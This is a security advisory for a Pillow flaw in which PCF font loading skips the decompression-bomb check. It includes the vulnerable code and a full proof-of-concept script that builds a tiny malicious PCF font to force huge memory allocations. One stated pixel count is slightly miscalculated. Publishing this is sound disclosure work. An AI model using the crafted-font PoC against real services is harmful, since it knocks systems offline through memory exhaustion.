# [H] Pillow `PcfFontFile._load_bitmaps()`: `Image.frombytes()` called without `_decompression_bomb_check()` — bomb protection bypass via PCF font loading

## Summary
Severity: High
Advisory: GHSA-8v84-f9pq-wr9x
CVE: CVE-2026-54059
CWE: CWE-789
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-8v84-f9pq-wr9x
Type: github-advisory

## Affected
- PyPI: `pillow` — affected >=0 <12.3.0

## Details
## Description
`PIL/PcfFontFile.py` `_load_bitmaps()` (line 227) reads glyph dimensions from the PCF `METRICS` section and passes them directly to `Image.frombytes()` without calling `Image._decompression_bomb_check()`. Dimensions originate from unsigned 16-bit values:

```
xsize = right - left          (max: 65535 − 0 = 65535)
ysize = ascent + descent      (max: 65535 + 65535 = 131070)
```

Maximum exploitable pixel count: **65,535 × 131,070 = 8,589,734,450 pixels** — **48× the DecompressionBombError threshold**.

**Vulnerable code (`PIL/PcfFontFile.py` line 224–227):**
```python
for i in range(nbitmaps):
    xsize, ysize = metrics[i][:2]    # from PCF METRICS — attacker-controlled
    b, e = offsets[i : i + 2]
    bitmaps.append(
        Image.frombytes("1", (xsize, ysize), data[b:e], "raw", mode, pad(xsize))
        # ↑ NO _decompression_bomb_check()!
    )
```

`Image.frombytes()` calls `Image.new()` first (allocating the full C-heap buffer), **then** attempts to fill it. This creates two distinct attack paths:

- **Persistent attack**: Provide matching bitmap data → `frombytes()` succeeds → image stored in `font.glyph[ch]` permanently
- **Transient attack**: Provide a 148-byte PCF file with large declared dimensions but no data → `Image.new()` allocates the full buffer → `ValueError` → buffer freed → but the spike occurs before Python can respond

## Steps to reproduce

**Proof of Concept script:**

```python
#!/usr/bin/env python3
"""PoC: PcfFontFile bomb bypass — 148-byte PCF → 23 MB allocation"""
import io, struct, tracemalloc, warnings
warnings.filterwarnings("ignore")

from PIL.PcfFontFile import PcfFontFile
from PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError

W, H = 14000, 14000   # 196M pixels → above DecompressionBombError threshold

# Show what Image.open() would do
warnings.filterwarnings("error", category=DecompressionBombWarning)
try:
    _decompression_bomb_check((W, H))
except (DecompressionBombWarning, DecompressionBombError) as e:
    print(f"[Image.open() path] BLOCKED by {type(e).__name__}")
warnings.filterwarnings("ignore")

# PCF binary constants
PCF_MAGIC    = 0x70636601
PCF_PROPS    = 1 << 0
PCF_METRICS  = 1 << 2
PCF_BITMAPS  = 1 << 3
PCF_ENCODINGS= 1 << 5

def build_bomb_pcf(xsize, ysize):
    # Properties: empty
    props = struct.pack("<III", 0, 0, 0)

    # Metrics (jumbo, non-compressed): 1 glyph — xsize=right-left, ysize=ascent+descent
    metrics = struct.pack("<II", 0, 1)
    metrics += struct.pack("<HHHHHH", 0, xsize, xsize, ysize, 0, 0)

    # Bitmaps: 1 glyph, empty data (transient attack)
    bitmaps = struct.pack("<II", 0, 1)
    bitmaps += struct.pack("<I", 0)              # offset[0] = 0
    bitmaps += struct.pack("<IIII", 0, 0, 0, 0) # bitmap_sizes all = 0

    # Encodings: char 0x41 ('A') → glyph 0
    enc_offsets = [0xFFFF]*65 + [0] + [0xFFFF]*62
    encodings = struct.pack("<IHHHHH", 0, 0, 127, 0, 0, 0xFFFF)
    encodings += struct.pack("<" + "H"*128, *enc_offsets)

    secs = [(PCF_PROPS, props), (PCF_METRICS, metrics),
            (PCF_BITMAPS, bitmaps), (PCF_ENCODINGS, encodings)]
    hdr_size = 4 + 4 + len(secs) * 16
    out = struct.pack("<II", PCF_MAGIC, len(secs))
    offset = hdr_size
    for stype, sdata in secs:
        out += struct.pack("<IIII", stype, 0, len(sdata), offset)
        offset += len(sdata)
    for _, sdata in secs:
        out += sdata
    return out

pcf = build_bomb_pcf(W, H)
print(f"[*] PCF file size  : {len(pcf)} bytes")
print(f"[*] Glyph size     : {W} x {H} = {W*H:,} pixels")
print(f"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)")

tracemalloc.start()
try:
    font = PcfFontFile(io.BytesIO(pcf))
    _, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    print(f"[!] CONFIRMED (persistent): bomb check bypassed — heap peak {peak/1024**2:.2f} MB")
except Exception as e:
    _, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    print(f"[!] CONFIRMED (transient): {type(e).__name__} after allocation")
    print(f"    Heap peak: {peak/1024**2:.2f} MB")
    print(f"    C-heap allocation of ~{W*H//8//1024**2} MB occurred before exception")
```

**Expected output:**
```
[Image.open() path] BLOCKED by DecompressionBombError
[*] PCF file size  : 148 bytes
[*] Glyph size     : 14000 x 14000 = 196,000,000 pixels
[*] C-heap target  : 23 MB  (mode '1' = 1 bit/pixel)
[!] CONFIRMED (transient): ValueError after allocation
    C-heap allocation of ~23 MB occurred before exception
```

**Amplification table:**

| PCF file | Glyph dims | C-heap (mode '1') | Bomb check |
|---|---|---|---|
| 148 bytes | 14000 × 14000 | 23 MB (transient) | Bypassed |
| 148 bytes | 65535 × 131070 | 1.07 GB (transient) | Bypassed |
| ~512 MB | 65535 × 131070 | 1.07 GB (persistent) | Bypassed |

## Impact
- **Availability**: HIGH — up to 1.07 GB per glyph, no limit per font file
- **Confidentiality**: None
- **Integrity**: None
- Any service loading PCF fonts from untrusted sources (e.g., `PcfFontFile(fp)`) is affected
- `PcfFontFile` is never loaded via `Image.open()`, so the bomb check protection is completely absent from the entire PCF font loading path
- Confirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-07

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-8v84-f9pq-wr9x
- https://nvd.nist.gov/vuln/detail/CVE-2026-54059
- https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d
- https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2253.yaml
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst
